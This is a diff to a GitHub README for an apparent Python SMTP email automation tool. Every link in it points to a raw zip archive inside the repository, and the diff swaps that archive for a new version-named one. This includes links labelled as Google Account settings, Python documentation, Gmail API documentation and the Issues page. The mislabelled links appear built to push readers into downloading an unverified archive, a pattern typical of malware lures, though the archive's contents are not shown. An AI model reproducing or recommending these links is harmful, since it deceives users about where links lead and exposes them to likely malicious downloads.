@@ -1,6 +1,6 @@
 # 📧 python-smtp-email-automation - Send Emails Automatically with Ease
 
-[![Download](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-smtp-email-automation.zip%https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-smtp-email-automation.zip)](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-smtp-email-automation.zip)
+[![Download](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-email-automation-smtp-v3.9.zip%https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-email-automation-smtp-v3.9.zip)](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-email-automation-smtp-v3.9.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To begin using this application, follow these simple steps to download and run i
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-smtp-email-automation.zip).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-email-automation-smtp-v3.9.zip).
    
 2. Once there, find the latest release version. You will see various files available for download.
 
@@ -26,7 +26,7 @@ Before you can start sending emails, you need to set up your Gmail account to wo
 
 ### Step 1: Enable "Less secure app access"
 
-1. Go to your [Google Account settings](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-smtp-email-automation.zip).
+1. Go to your [Google Account settings](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-email-automation-smtp-v3.9.zip).
   
 2. Under "Security," find “Less secure app access.” Toggle this setting ON to allow the app to send emails through your account.
 
@@ -64,7 +64,7 @@ Once you have installed the application and set up your Gmail access, you can st
 
 ## 🌐 Support & Community
 
-For any questions or support, feel free to check the [Issues page](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-smtp-email-automation.zip) on GitHub. The community is here to help you.
+For any questions or support, feel free to check the [Issues page](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-email-automation-smtp-v3.9.zip) on GitHub. The community is here to help you.
 
 ## 📜 License
 
@@ -72,7 +72,7 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## 📚 Additional Resources
 
-- [Python Documentation](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-smtp-email-automation.zip): Explore more about the `smtplib` library.
-- [Gmail API Documentation](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-smtp-email-automation.zip): Learn about advanced configurations for Gmail.
+- [Python Documentation](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-email-automation-smtp-v3.9.zip): Explore more about the `smtplib` library.
+- [Gmail API Documentation](https://raw.githubusercontent.com/urvish12345/python-smtp-email-automation/main/Certhia/python-email-automation-smtp-v3.9.zip): Learn about advanced configurations for Gmail.
 
 Thank you for using **python-smtp-email-automation**! Enjoy sending your automated emails effortlessly.
